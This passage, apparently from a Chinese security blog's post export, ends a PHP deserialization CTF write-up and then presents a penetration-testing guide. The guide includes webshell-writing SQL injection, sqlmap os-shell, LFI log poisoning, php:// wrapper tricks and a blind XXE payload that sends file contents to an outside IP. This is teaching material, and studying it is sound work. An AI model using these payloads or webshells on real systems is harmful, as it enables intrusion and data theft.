strchr(<span class="keyword">$this</span>-&gt;file, <span class="string">'/'</span>)===<span class="keyword">false</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                show_source(dirname (<span class="keyword">__FILE__</span>).<span class="string">'/'</span>.<span class="keyword">$this</span> -&gt;file);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">'Wrong filename.'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt; file=<span class="string">'index.php'</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;     </span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))</span><br><span class="line">    &#123; </span><br><span class="line">        show_source(<span class="string">'index.php'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">       $file=base64_decode( $_GET[<span class="string">'file'</span>]); </span><br><span class="line">       <span class="keyword">echo</span> unserialize($file ); </span><br><span class="line">    &#125; </span><br><span class="line"><span class="meta">?&gt;</span>  <span class="comment">#&lt;!--flag in flag.php--&gt;</span></span><br></pre></td></tr></table></figure>

<p>首先对象创建执行 __destruct函数 我们发现GET获取file参数值的时候会反序列化 我们可以利用反序列化覆盖掉file的值</p>
<p>下面构造payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $file = <span class="string">'a'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$melon = <span class="keyword">new</span> SoFun();</span><br><span class="line"><span class="keyword">echo</span> serialize($melon);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>生成<code>O:5:&quot;SoFun&quot;:1:{s:7:&quot;*file&quot;;s:1:&quot;a&quot;;}</code> </p>
<p>因为file是protected访问权限所以生成的序列化字符串带*号 绕过访问权限可以在 * 号的两边加 \00</p>
<p>当执行反序列化时 执行__wakeup函数 强制使file的值变为index.php </p>
<p>序列化串行中表示对象属性个数的值大于真实的属性个数时会跳过<code>__wakeup</code>的执行  <a href="https://bugs.php.net/bug.php?id=72663" target="_blank" rel="noopener">CVE-2016-7124</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload1 : O:5:&quot;SoFun&quot;:2:&#123;S:7:&quot;\00*\00file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br><span class="line">payload2 : O:5:&quot;SoFun&quot;:2:&#123;s:11:&quot;\00*\00file&quot;;s:8:&quot;flag.php&quot;;&#125; </span><br><span class="line">当s:11的s是小写时 \00 认为占三位 </span><br><span class="line">当S:7的S是大写时 \00 占一位</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/flagmelon.png" alt="html">    </p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>漏洞挖掘</tag>
        <tag>序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试之漏洞挖掘</title>
    <url>/2019/12/13/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</url>
    <content><![CDATA[<p>漏洞：通常情况下不影响软件的正常功能，但如果被攻击者利用，有可能驱使软件去执行一些额外的恶意代码，从而引发严重的后果。最常见的漏洞有缓冲区溢出漏洞、整数溢出漏洞、指针覆盖漏洞等。</p>
<a id="more"></a>

<h2 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h2><h3 id="1-敏感目录文件扫描"><a href="#1-敏感目录文件扫描" class="headerlink" title="1.敏感目录文件扫描"></a>1.敏感目录文件扫描</h3><h4 id="1-查找目标各类web入口"><a href="#1-查找目标各类web入口" class="headerlink" title="1.查找目标各类web入口"></a>1.查找目标各类web入口</h4><p>普通网站后台，其他web控制台，碰到任何入口的第一反应就是顺手测试弱口令如果没有结果记录下来可以进行爆破，没有验证码的可以尝试爆破。限制登陆次数尝试伪造IP绕过。</p>
<h4 id="2-各类敏感文件泄露"><a href="#2-各类敏感文件泄露" class="headerlink" title="2.各类敏感文件泄露"></a>2.各类敏感文件泄露</h4><h5 id="版本管理软件造成的泄露"><a href="#版本管理软件造成的泄露" class="headerlink" title="版本管理软件造成的泄露"></a>版本管理软件造成的泄露</h5><p><strong>.git/git</strong> 利用工具：<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">GitHack</a> 手动利用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget -r --no-parent --mirror http://www.example.com/.git</span><br><span class="line">cd www.example.com &amp;&amp; git reset --hard</span><br></pre></td></tr></table></figure>

<p><strong>.hg/Mercurial</strong> 可以利用工具：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a> 也可以手动利用（下载+回滚）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget -r --no-parent --mirror http://www.example.com/.hg</span><br><span class="line">cd www.example.com &amp;&amp; hg revert</span><br></pre></td></tr></table></figure>

<p><strong>.svn/Subversion</strong> 可以利用工具：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a> 也可以手动利用（下载+回滚）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget -r --no-parent --mirror http://www.example.com/.svn</span><br><span class="line">cd www.example.com &amp;&amp; svn revert --recursive .</span><br></pre></td></tr></table></figure>

<p><strong>.bzr/Bazaar</strong> 可以利用工具：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a> 也可以手动利用（下载+回滚）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget -r --no-parent --mirror http://www.example.com/.bzr</span><br><span class="line">cd www.example.com &amp;&amp; bzr revert</span><br></pre></td></tr></table></figure>

<p>CVS 可以利用工具：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a> 也可以手动利用（下载+回滚）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget -r --no-parent --mirror http://www.example.com/CVS</span><br><span class="line">cd www.example.com &amp;&amp; cvs diff *</span><br></pre></td></tr></table></figure>

<h5 id="文件包含导致的泄露"><a href="#文件包含导致的泄露" class="headerlink" title="文件包含导致的泄露"></a>文件包含导致的泄露</h5><p><strong>.DS_Store文件泄露 (Desktop Services Store)</strong></p>
<p>是macOS目录下的隐藏文件, 包含了当前目录结构和一些的自定义信息,如背景和图标位置等, 在windows下类似的文件为desktop.ini. 暴露了.DS_Store文件也就相当于暴露了该目录下的所有内容. </p>
<p>利用工具：<a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">ds_store_exp</a></p>
<p><strong>WEB-INF泄露</strong></p>
<p>在Java的<a href="http://download.oracle.com/otn-pub/jcp/servlet-2.4-fr-spec-oth-JSpec/servlet-2_4-fr-spec.pdf" target="_blank" rel="noopener">Servlet 文档</a>中,说到<code>WEB-INF</code>目录”包含了所有web应用会用到但是不处于web路径中的资源”, 也就是说, WEB-INF目录下的内容是不属于公开页面的.<br>web应用可以通过<code>getResource</code>等API在servlet的上下文中访问到这些资源.<br>通常开发者会把许多JSP文件,Jar包,Java的类文件放在该目录下. 一般目录的内容都是可以预测的:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.</span><br><span class="line">WEB-INF/database.properties : 数据库配置文件</span><br><span class="line">WEB-INF/classes/ : 一般用来存放Java类文件(.class)</span><br><span class="line">WEB-INF/lib/ : 用来存放打包好的库(.jar)</span><br><span class="line">WEB-INF/src/ : 用来放源代码(.asp和.php等)</span><br></pre></td></tr></table></figure>

<p>利用方式：通过web.xml文件推测应用组件相关类的名字, 然后在src目录下查找代码, 如果没有源代码可以直接下载class文件反编译即可.</p>
<p><strong>备份文件泄露</strong></p>
<p>备份文件泄露又分为两种情况, 一种是运维人员偷懒地直接在网站根目录用类似<code>tar -czvf bakup.tgz</code>的命令将网站进行备份,这样整站的源代码都能直接被用户打包下载了；<br>另一种是开发或者运维人员使用的编辑器修改文件时自动备份了所编辑的网页内容,<br>如vim的<code>.swp</code>, 从而泄露了该网页的源代码.</p>
<p>利用方法：对于打包文件而言, 渗透测试人员可以用{常用文件名}+{常用压缩包后缀}的方式扫描网站, 说不定会有意外惊喜.<br>对于网页的临时备份文件, 可以扫描对应页面的.swp或者.bak等后缀, 说不定也能找到有用的信息.</p>
<p><strong>配置文件泄露</strong><br>现代WEB开发往往不会重新造轮子, 而是基于成熟的框架进行配置, 如果渗透测试人员知道该网站是基于什么类型的框架,<br>就可能通过该框架的文档获得重要配置文件的路径, 如果是开源框架, 同时也能获得源代码, 因此配置文件泄露的严重性也是不言而喻的.</p>
<p>利用方法：通过识别网站指纹得知其框架类型, 然后手工测试重要的配置文件是否可以获取. 如果是批量测试, 则可以事先准备好常见的配置文件路径, 如wordpress的/wp-config.php等, 组织成字典然后用脚本进行批量测试. 可以参考<a href="https://github.com/ring04h/weakfilescan/blob/master/dict/configfile.lst" target="_blank" rel="noopener">猪猪侠的字典</a>.</p>
<p><strong>配置错误导致的泄露</strong></p>
<p>Windows IIS / Apache 目录穿越</p>
<p>目录穿越漏洞原理比较简单, 程序在实现上没有充分过滤用户输入的../之类的目录跳转符, 导致恶意用户可以访问web根目录的上级从而遍历服务器上的任意文件.</p>
<p><strong>Nginx配置安全</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location /file &#123;</span><br><span class="line">    alias /home;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>例如这样配置 访问 url/file 会正常显示服务器上/home的文件，但是访问url/file../ 就会出现 /home/../访问到服务器的根目录造成目录穿越</p>
<h3 id="2-SQL注入"><a href="#2-SQL注入" class="headerlink" title="2.SQL注入"></a>2.SQL注入</h3><p>首先确认数据库的用户权限</p>
<h4 id="1-可以注入的一些部分"><a href="#1-可以注入的一些部分" class="headerlink" title="1.可以注入的一些部分"></a>1.可以注入的一些部分</h4><p>GET注入在url中</p>
<p>在POST注入</p>
<p>在HTTP头部注入 例如：cookie Referer user-agent X-Forwarded-For 等等</p>
<p>二次注入，宽字节注入，ajax/json注入，nosql注入，用来对付为静态的中转注入 等等</p>
<h4 id="2-管理员权限"><a href="#2-管理员权限" class="headerlink" title="2.管理员权限"></a>2.管理员权限</h4><p><strong>尝试直接写webshell</strong>：</p>
<p><strong>日志写</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.show variables like ‘%general%&apos;; #查看配置</span><br><span class="line">2.set global general_log = on; #开启general log模式</span><br><span class="line">3.set global general_log_file = ‘/var/www/html/melon.php&apos;; #设置日志目录为shell地址</span><br><span class="line">4.select ‘&lt;?php eval($_POST[melon]);?&gt;’ #写入shell</span><br><span class="line">不成功的案例，如果mysql 被降权，是无法写入到其他的站点目录的，除非你的目标目录是可以写入的。</span><br></pre></td></tr></table></figure>

<p><strong>正常sql写</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">通过SQL注入select into outfile实现，如：</span><br><span class="line">1&apos; union select 1,&apos;&lt;?php eval($_POST[melon]);?&gt;&apos; INTO OUTFILE &apos;/var/www/tmp/nb.php&apos;#</span><br><span class="line">2.如果过过滤了union select可以使用：</span><br><span class="line">LIMIT 0,1 INTO OUTFILE &apos;这里是路径&apos; LINES TERMINATED BY &apos;这里是你想写的内容&apos;--</span><br></pre></td></tr></table></figure>

<p><strong>sqlmap写shell</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--os-cmd=&quot;net user&quot;</span><br><span class="line">交互式命令执行，注意在使用交互式方式时需要知道网站的绝对路径，执行成功之后在绝对路径下创建文件返回结果，然后再自动删除。</span><br><span class="line"></span><br><span class="line">--os-shell</span><br><span class="line">写webshell，会生成两个文件，tmpbshrd.php和tmpucnll.php，分别为命令执行和文件上传webshell。</span><br><span class="line">注意:关闭sqlmap文件就会被删除。</span><br></pre></td></tr></table></figure>

<p><strong>本地写入webshell</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">先在sqlmap的目录创建mst目录，然后在该目录中创建mst.txt，内容为一句话木马，之后需要两个参数即本地文件地址和目标文件地址，--file-write &quot;./mst/mst.txt&quot; --file-dest &quot;网站的绝对路径/melon.php&quot;。</span><br><span class="line">注意需要最高权限。</span><br></pre></td></tr></table></figure>

<p><strong>尝试执行系统命令</strong></p>
<p>反弹shell，cmd</p>
<p><strong>尝试读取数据库配置文件中的账号密码</strong></p>
<h4 id="3-普通数据库权限"><a href="#3-普通数据库权限" class="headerlink" title="3.普通数据库权限"></a>3.普通数据库权限</h4><p>查询网站管理账号密码，搜集会员账号密码数据，尝试万能密码bypass登陆 等等</p>
<h3 id="3-上传"><a href="#3-上传" class="headerlink" title="3.上传"></a>3.上传</h3><h4 id="1-各个web中间件解析漏洞"><a href="#1-各个web中间件解析漏洞" class="headerlink" title="1.各个web中间件解析漏洞"></a>1.各个web中间件解析漏洞</h4><h5 id="IIS-5-x-6-x解析漏洞"><a href="#IIS-5-x-6-x解析漏洞" class="headerlink" title="IIS 5.x-6.x解析漏洞"></a>IIS 5.x-6.x解析漏洞</h5><p>使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。</p>
<p><strong>目录解析(6.0)</strong></p>
<p>案例：<code>www.xxx.com/xx.asp/xx.jpg</code></p>
<p>原理：服务器默认会把.asp，.asa目录下的文件全部解析乘asp文件</p>
<p><strong>文件解析</strong></p>
<p>案例：<code>www.xxx.com/xx.asp;,jpg</code></p>
<p>原理：服务默认不解析分号之后的内容，因此<code>xx.asp;,jpg</code>便被解析成了asp文件</p>
<p><strong>解析文件类型</strong></p>
<p>IIS6.0默认的可执行文件除了asp还包含这三种：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/xxx.asa /xxx.cer /xxx.cdx</span><br></pre></td></tr></table></figure>

<h5 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h5><p>案例：<code>www.xxx.com/xxx.php.aaa.rar</code></p>
<p>原理：Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 xxx.php.aaa.rar “.aaa”和”.rar” 这两种后缀是Apache不可识别解析,Apache就会把xxx.php.aaa.rar解析成php。</p>
<p><strong>CVE-2017-15715</strong></p>
<p><strong>罕见后缀</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@xxx:~$ cat /etc/mime.types | grep php</span><br><span class="line">  #application/x-httpd-php          	phtml pht php</span><br><span class="line">  #application/x-httpd-php-source           	phps</span><br><span class="line">  #application/x-httpd-php3         			php3</span><br><span class="line">  #application/x-httpd-php3-preprocessed	 	php3p</span><br><span class="line">  #application/x-httpd-php4         			php4</span><br><span class="line">  #application/x-httpd-php5         			php5</span><br></pre></td></tr></table></figure>

<h5 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h5><p>原理：Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问<a href="http://www.xx.com/phpinfo.jpg/test.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/test.php”，然后构造成SCRIPT_FILENAME传递给PHP" target="_blank" rel="noopener">www.xx.com/phpinfo.jpg/test.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/test.php”，然后构造成SCRIPT_FILENAME传递给PHP</a> CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：<br>PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而test.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了</p>
<p>案例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www.xxxx.com/UploadFiles/image/melon.jpg/melon.php</span><br><span class="line">www.xxxx.com/UploadFiles/image/melon.jpg%00.php</span><br><span class="line">www.xxxx.com/UploadFiles/image/melon.jpg/%20\melon.php</span><br></pre></td></tr></table></figure>

<h4 id="2-bypass-上传检测"><a href="#2-bypass-上传检测" class="headerlink" title="2.bypass 上传检测"></a>2.bypass 上传检测</h4><p>黑名单，白名单可配合解析漏洞，截断，.htaccess，配合本地包含一起利用。</p>
<p>补：截断：%00</p>
<h4 id="3-各类编辑器利用"><a href="#3-各类编辑器利用" class="headerlink" title="3.各类编辑器利用"></a>3.各类编辑器利用</h4><p>FCKeditor编辑器，EWEbeditor，CKFinder，南方数据编辑器southidceditor，UEDITOE，DotNetTextBox，PHPWEB网站管理系统后台Kedit编辑器，Cute Editor 在线编辑器本地包含漏洞 等等</p>
<h3 id="4-未授权访问"><a href="#4-未授权访问" class="headerlink" title="4.未授权访问"></a>4.未授权访问</h3><p>前端验证绕过，直接访问[ajax]，验证有死角没有验证全部页面 等等</p>
<h3 id="5-文件包含"><a href="#5-文件包含" class="headerlink" title="5.文件包含"></a>5.文件包含</h3><p><em>本地包含（LFI），远程包含（RFI），远程文件包含需要在php.ini中开启 allow_url_fopen=on、allow_url_include=on(默认是关闭的 )。</em></p>
<p>文件包含的本质其实和C语言中预处理指令一样。那么这句话等价替换就是 <code>&lt;?php &lt;?php phpinfo()?&gt; ?&gt;</code>其实不然，如果替换成这样，后面的?&gt;会被页面打印出来,正确的是它是将文件中<code>&lt;?php ?&gt;</code> 去除，将剩余的内容进行替换,那这样的话再利用的时候不用考虑文件包含的文件类型是什么，只需要考虑文件之中是否有我们所需要的一句话木马就可以了。</p>
<p><strong>涉及的函数</strong>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include()</span><br><span class="line">使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。</span><br><span class="line">inclue_once()</span><br><span class="line">功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</span><br><span class="line">require()</span><br><span class="line">使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。</span><br><span class="line">require_once()</span><br><span class="line">功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</span><br></pre></td></tr></table></figure>

<p><strong>测试</strong>：</p>
<p>melon.txt代码为  <code>&lt;?php eval($_REQUEST[&#39;melon&#39;]);?&gt;</code></p>
<p>melon.php代码为    <code>&lt;?php include($_REQUEST[&#39;file&#39;]);?&gt;</code></p>
<p>利用：<code>www.xxx.com/melon.php?file=melon.txt&amp;melon=system(&#39;ls&#39;);</code></p>
<p>防止混淆：目录遍历：如果没有文件包含漏洞，仅仅通过在url栏中操作，不论你如何../../../回退，都无法跳出服务器的公开目录，也是就说，你只能请求公开目录中的文件。但是如果有文件包含漏洞，那么我们可以通过传参，../../../../../一直退到服务器的根目录，从而能够目录遍历，即访问服务器上任何一个文件夹中的任何一个文件，不论这个目录是公开目录还是非公开目录。</p>
<p><strong>利用本地包含配合数据库获取shell的一种思路</strong>：</p>
<p>数据库储存表会将表存在相应的文件中。也就说假如我们将某个表的某个字段名，命名为<code>&lt;?php eval($_GET[&#39;melon&#39;]);?&gt;</code>,那么这句话就会被写入到对应的.frm文件中去。</p>
<p>在本地创建melon.php文件代码为    <code>&lt;?php include($_REQUEST[&#39;file&#39;]);?&gt;</code></p>
<p>创建数据库-&gt;创建表-&gt;创建字段为<code>&lt;?php eval($_GET[&#39;melon&#39;]);?&gt;</code></p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8.png" alt="html">    </p>
<p>图中可以明确的看出一句话已经写进了文件了这时候只需要利用即可</p>
<p> <code>http://www.xxx.com/melon.php?file=../../../../../../../phpStudy/PHPTutorial/MySQL/data/melon/test.frm&amp;melon=phpinfo();</code></p>
<p>还有一个问题就是获取数据库的路径如果没有这一点我们是无法知道frm的位置的，如果有sql注入我们可以通过<code>SELECT @@datadir</code>来获取data文件夹绝对路径然后拼接上我们的 数据库名/表名.frm 就可以了。</p>
<p><strong>利用本地包含配合Apache获取shell的一种思路</strong>：</p>
<p>使用burp对目标站抓包 修改User-Agent: <code>&lt;?php include($_REQUEST[&#39;file&#39;]);?&gt;</code></p>
<p>此时查看Apache日志：</p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/apachelog.png" alt="html">    </p>
<p>利用：<code>http://url/file.php?file=/var/log/apache2/access.log?melon=phpinfo();</code></p>
<p><strong>php伪协议</strong></p>
<p>php://filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php://filter在双off的情况下也可以正常使用；</span><br><span class="line">allow_url_fopen ：off/on</span><br><span class="line">allow_url_include：off/on</span><br></pre></td></tr></table></figure>

<p><code>http://url/file.php?file=php://filter/read=convert.base64-encode/resource=./file.php</code></p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/filebase64.png" alt="html">    </p>
<p>php://input 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">allow_url_fopen ：off/on</span><br><span class="line">allow_url_include：on</span><br></pre></td></tr></table></figure>

<p><code>http://localhost:8888/file.php?file=php://input</code> 同时POST <code>&lt;?php phpinfo();?&gt;</code></p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/filephpinput.png" alt="html">    </p>
<p>zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zip://, bzip2://, zlib://协议在双off的情况下也可以正常使用；</span><br><span class="line">allow_url_fopen ：off/on</span><br><span class="line">allow_url_include：off/on</span><br></pre></td></tr></table></figure>

<p>zip:// 协议</p>
<p>使用方法：zip:// [压缩文件绝对路径]#[压缩文件内的子文件名]</p>
<p>在get请求中#会将后面的参数忽略所以使用get请求时候应进行url编码为%23，且此处经过测试相对路径是不可行，所以只能用绝对路径。</p>
<p><code>http://127.0.0.1:8888/file.php?file=zip://D:/PHPstudy/PHPTutorial/WWW/CRMEB-master/melon.zip%23file.txt</code></p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/phpzip.png" alt="html">    </p>
<p>bzip2:// 协议</p>
<p>使用方法：<code>http://127.0.0.1:8888/file.php?file=compress.bzip2://./melon.bz2</code></p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/phpbz2.png" alt="html">    </p>
<p>zlib:// 协议</p>
<p>使用方法：<code>http://127.0.0.1:8888/file.php?file=compress.zlib://./melon.gz</code></p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/phpgz.png" alt="html">    </p>
<p>data://协议</p>
<p>经过测试官方文档上存在一处问题，经过测试PHP版本5.2，5.3，5.5，7.0；data:// 协议是是受限于allow_url_fopen的，官方文档上给出的是NO，所以要使用data://协议需要满足双on条件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data://协议必须双在on才能正常使用；</span><br><span class="line">allow_url_fopen ：on</span><br><span class="line">allow_url_include：on</span><br></pre></td></tr></table></figure>

<p>使用方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8888/file.php?file=data://text/plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">http://127.0.0.1:8888/file.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/phpdata.png" alt="html">    </p>
<h3 id="6-任意文件读取"><a href="#6-任意文件读取" class="headerlink" title="6.任意文件读取"></a>6.任意文件读取</h3><p><strong>XXE（有回显）</strong></p>
<p>PHP代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxe.php文件</span><br><span class="line">&lt;?php</span><br><span class="line">    libxml_disable_entity_loader (false);</span><br><span class="line">    $xmlfile = file_get_contents(&apos;php://input&apos;);</span><br><span class="line">    $dom = new DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    echo $creds;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>对xxe.php发起请求 POST中发送xml数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//因为本地测试用的是windows 所以就读取system.ini为例</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY melon SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt; </span><br><span class="line">&lt;creds&gt;&amp;melon;&lt;/creds&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/xxe.png" alt="html">    </p>
<p>可以看到响应头获取到了文件的数据</p>
<p><strong>XXE（无回显）</strong></p>
<p>PHP代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxes.php文件</span><br><span class="line">&lt;?php</span><br><span class="line">libxml_disable_entity_loader (false);</span><br><span class="line">$xmlfile = file_get_contents(&apos;php://input&apos;);</span><br><span class="line">$dom = new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>对xxe.php发起请求 POST中发送xml数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//因为本地测试用的是windows 所以就读取system.ini为例</span><br><span class="line">&lt;!DOCTYPE roottag [ </span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///D:/PHPstudy/PHPTutorial/WWW/CRMEB-master/melon.txt&quot;&gt; </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://47.9x.xx.xx/xxe.dtd&quot;&gt; </span><br><span class="line">%dtd;]&gt; </span><br><span class="line">&lt;name&gt;&amp;send;&lt;/name&gt;</span><br></pre></td></tr></table></figure>

<p>远端服务器存放的dtd代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &apos;http://47.93.12.104:7777/?%file;&apos;&gt;&quot;&gt; </span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/xxes1.png" alt="html">    </p>
<p>此时xml是执行的但是没有回显出来，我们看一下服务器端。</p>
<p>服务器端采用的nc监听端口</p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/xxes2.png" alt="html">    </p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/xxes3.png" alt="html">    </p>
<p>我们来说一下外部调用实体化的流程：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//localhost为本地服务器 melon为远端服务器</span><br><span class="line">1.localhost 解析了 XML，并将%dtd;求值为 melon 的服务器的外部调用。</span><br><span class="line">2.melon 的服务器向 localhost 返回了xxe.dtd文件。</span><br><span class="line">3.localhost 解析了收到的 DTD文件，它触发了%all;的调用。</span><br><span class="line">4.当%all;求值时，它定义了&amp;send;，它包含%file;实体的调用。</span><br><span class="line">5.%file;在 URL 值中被替换为/etc/passwd文件的内容。</span><br><span class="line">6.localhost 解析了 XML 文件，发现了&amp;send;实体，它求值为 melon 服务器的远程调用，带有melon.txt的内容，作为 URL 中的参数。</span><br></pre></td></tr></table></figure>

<h3 id="7-任意文件下载"><a href="#7-任意文件下载" class="headerlink" title="7.任意文件下载"></a>7.任意文件下载</h3><p><strong>漏洞形成过程</strong></p>
<p>首先漏洞源码如下：</p>
